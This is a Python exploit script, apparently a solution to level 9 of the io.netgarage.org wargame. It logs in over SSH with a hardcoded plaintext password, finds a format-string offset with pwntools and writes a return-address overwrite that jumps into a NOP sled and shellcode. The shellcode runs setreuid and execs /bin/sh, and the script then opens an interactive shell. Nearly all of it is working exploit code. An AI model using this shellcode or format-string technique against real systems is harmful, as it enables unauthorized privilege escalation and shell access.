import base64
from pwn import *


ret_location = 0x80494d4
shellcode = b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
shellcode_location = 0xbffffd9e

shift = 0x12 # How much to shift shellcode by (to prevent nulls, and to line up the offset properly)
nop_sled_len = 0x10 # How long a nop sled

shellcode = b'\x90' * (shift + nop_sled_len) + shellcode
shellcode_location += shift

payload_dict = {ret_location : shellcode_location}

sshconn = ssh(host='io.netgarage.org',
			  user='level9',
			  password='ise9uHhjOhZd0K4G')

# --

def exec_fmt(payload):
	payload = shellcode + payload
	p = sshconn.process(['/levels/level09', payload])
	log.info("Using payload = %s" % repr(payload))
	recvd = p.recvall()
	log.info("Received = %s" % repr(recvd))
	p.close()
	return recvd

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
#offset = 21

print('Offset: %d' % offset)
payload = shellcode + fmtstr_payload(offset, payload_dict, numbwritten=len(shellcode))

print(len(payload))
print(payload)
print(base64.b64encode(payload))

p = sshconn.process(['/levels/level09', payload])
p.interactive()
